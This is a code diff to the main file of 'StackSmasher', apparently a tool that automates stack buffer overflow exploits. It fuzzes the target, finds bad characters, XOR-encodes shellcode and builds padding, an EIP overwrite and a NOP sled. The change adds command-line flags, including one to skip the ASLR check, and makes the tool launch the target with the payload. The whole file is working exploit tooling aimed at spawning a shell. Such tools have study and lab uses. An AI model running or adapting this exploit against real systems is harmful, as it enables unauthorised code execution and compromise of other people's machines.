@@ -1,51 +1,51 @@
 #include <iostream>
 #include <string>
+#include "argparse.hpp"
 #include "Log/Log.hpp"
 #include "Utility/Filesystem/File.hpp"
 #include "Encoder/XorEncoder.hpp"
 #include "Stages/Fuzzer/Fuzzer.hpp"
 #include "Stages/BadCharacters/BadCharacters.hpp"
 
-void printHelp(char* application)
-{
-    std::cerr << application << " [verbose|exploit] payload-file application-file" << std::endl;
-}
-
 int main(int argc, char* argv[])
 {
-    // Show help message
-    if (argc < 4)
-    {
-        printHelp(argv[0]);
-        return 1;
+    // Arguments
+    argparse::ArgumentParser program("StackSmasher", "1.0.0");
+    program.add_argument("application").help("The target application being tested");
+    program.add_argument("-p", "--payload").help("The binary payload file to be sent").nargs(1).default_value(std::string("payloads/sh.bin"));
+    program.add_argument("-v", "--verbose").help("Verbosity level: 0-4").nargs(1).default_value(1).action([](const std::string& value) { return std::stoi(value); });
+    program.add_argument("-n", "--nops").help("The number of NOPs to put in the NOP sled before the shell").nargs(1).default_value(20).action([](const std::string& value) { return std::stoi(value); });
+    program.add_argument("--python").help("Print the exploit as a python script").default_value(false).implicit_value(true);
+    program.add_argument("--skip-aslr-check").help("Skip checking if ASLR is enabled and proceed anyway").default_value(false).implicit_value(true);
+    program.add_argument("--skip-encoding").help("Skip encoding the payload and checking bad characters").default_value(false).implicit_value(true);
+
+    // Argument Parsing
+    try {
+        program.parse_args(argc, argv);
+    }
+    catch (const std::runtime_error& err) {
+        std::cout << err.what() << std::endl << std::endl;
+        std::cout << program;
+        exit(0);
     }
 
-    std::string mode = std::string(argv[1]);
-    if (mode == "verbose")
-        Log::mode = LogMode::Verbose;
-    else if (mode == "exploit")
-        Log::mode = LogMode::Exploit;
-    else
-    {
-        printHelp(argv[0]);
-        return 2;
-    }
-
-    std::string application = std::string(argv[3]);
+    Log::verbose = (VerbosityLevel)program.get<int>("--verbose");
+    std::string application = program.get<std::string>("application");
 
     // Ensure ASLR is disabled
-    if (Application::isAslrEnabled())
+    if (program["--skip-aslr-check"] == false && Application::isAslrEnabled())
     {
-        Log::error("ASLR is enabled but not supported by this application.\n");
+        Log::error(VerbosityLevel::Standard, "ASLR is enabled but not supported by this application.\n");
         return 3;
     }
 
     // Read payload
+    std::string shell = "";
     size_t rawPayloadSize = 0;
-    uint8_t* rawayload = File::readAllBytes(std::string(argv[2]), &rawPayloadSize);
-    if (rawayload == nullptr)
+    uint8_t* rawPayload = File::readAllBytes(program.get<std::string>("--payload"), &rawPayloadSize);
+    if (rawPayload == nullptr)
     {
-        Log::error("Failed to read the payload file.\n");
+        Log::error(VerbosityLevel::Standard, "Failed to read the payload file.\n");
         return 4;
     }
 
@@ -54,28 +54,38 @@ int main(int argc, char* argv[])
         return 5;
 
     // Find bad characters
-    if (!BadCharacters::run(application))
-        return 5;
+    if (program["--skip-encoding"] == false)
+    {
+        if (!BadCharacters::run(application))
+            return 5;
 
-    // Encode shell
-    Log::info("XOR encoding payload...\n");
-    std::string shell = XorEncoder::encode(rawayload, rawPayloadSize, Application::badCharacters.data(), Application::badCharacters.size());
+        // Encode shell
+        Log::info(VerbosityLevel::Standard, "XOR encoding payload...\n");
+        shell = XorEncoder::encode(rawPayload, rawPayloadSize, Application::badCharacters.data(), Application::badCharacters.size());
+    }
+    else
+        shell = std::string((char*)rawPayload, rawPayloadSize);
 
     // Free raw payload
-    free(rawayload);
-    rawayload = nullptr;
+    free(rawPayload);
+    rawPayload = nullptr;
 
     // Build payload
     Payload* payloadBuilder = Payload::builder()
         ->padding()
-        ->eip()
-        ->nopSled()
-        ->append(shell);
+        ->eip();
+
+    // NOP Sled
+    int nops = program.get<int>("--nops");
+    if (nops > 0)
+        payloadBuilder->nopSled(nops);
+
+    payloadBuilder->append(shell);
     std::string payload = payloadBuilder->get();
     delete payloadBuilder;
 
     // Output python command
-    if (Log::mode == LogMode::Verbose)
+    if (program["--python"] == true)
     {
         std::string python = "";
         for (uint32_t i = 0; i < payload.length(); i++)
@@ -84,9 +94,10 @@ int main(int argc, char* argv[])
             sprintf(buffer, "\\x%02x", (uint8_t)(payload[i]));
             python += std::string(buffer);
         }
-        Log::success("[%i bytes] python -c 'print(\"%s\")'\n", payload.length(), python.c_str());
+        Log::success(VerbosityLevel::Standard, "[%i bytes] python -c 'print(\"%s\")'\n", payload.length(), python.c_str());
     }
 
-    Log::exploit("%s", payload.c_str());
+    Log::success(VerbosityLevel::Standard, "Executing application with payload...\n_________________________________________\n\n");
+    Process::exec(application, { payload });
     return 0;
 }
